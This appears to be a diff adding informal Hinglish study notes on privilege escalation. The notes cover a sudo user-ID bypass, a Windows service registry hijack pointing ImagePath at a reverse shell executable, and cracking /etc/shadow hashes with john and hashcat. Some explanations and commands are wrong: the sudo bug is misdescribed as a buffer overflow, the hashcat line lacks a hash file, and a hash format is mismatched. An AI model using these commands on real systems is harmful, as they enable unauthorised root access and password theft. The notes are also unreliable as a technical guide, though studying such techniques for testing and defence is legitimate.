@@ -1,0 +1,144 @@
+last year linux me sudo ki vuln aithi bufferoverflow
+
+sudo ko choti si memory assign hoti hai or usko hum overflow krdete memory pr jitna access ho usse ziada mem lena (only possible if no mem restrictions)
+2 possibilities hain 
+
+1) DOS
+2) hum reg ko access krke apni mrzi se apna malcode run krwado
+
+2nd option pr
+=> sudo whoami (valid command)
+vuln to bufferoverflow
+=> sudo -u '-1' (user ids linux me 1 se shuru hote -1 mille to wo overflow krdeta)
+=> sudo -u largest-int (largest int se bhi asa hota)
+
+ziada tar temp-mem me hum exploit run krte
+
+search for any service in cmd of windows
+=> wmic 
+
+windows registry me local machine imp for priv esc
+windows registry me current machine imp for persistance
+
+
+cmd pr
+
+reg query path of Current control set in local machine
+
+cammand line ke through 
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------
+
+LINUX
+shadow me root id and pwd
+
+=> cat /etc/shadow (access denied)
+=> sudo cat /etc/shadow (accepted)
+
+
+john the ripper acha hai 
+hashcat best hai but resources ziada leta
+
+=> john hash --wordlist=/path/rockyou.txt --format=NTLM 
+=> john root.hassh --wordlist=/path/rockyou.txt
+root.hassh ke hash ko sb password se check kia or hame password batadia
+
+agar hash ka na pata chale to kali me by default 
+=> hash-identifier 'hash ko file se copy krke paste krna'
+
+
+hash mode pata hona chaheye
+-a attack mode(0 for dictionary attack) (3 for brute force attack)
+1800 mode hai
+=> hashcat -m 1800 -a 0 /path/rockyou.txt --force
+
+
+breach.vc for prev. hijacked passwords
+
+
+sudo ko check krne keleye list krta sare 
+=> sudo -l
+=> sudo 'koi bhi ik upr se run kro'
+
+website => GTFOBins
+linux me jitne bhi vuln hain wo list hojate
+
+
+=> ls -la /etc/sudoe
+=> uname -a 
+jo bhi version mille use google krke vuln nikalo  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
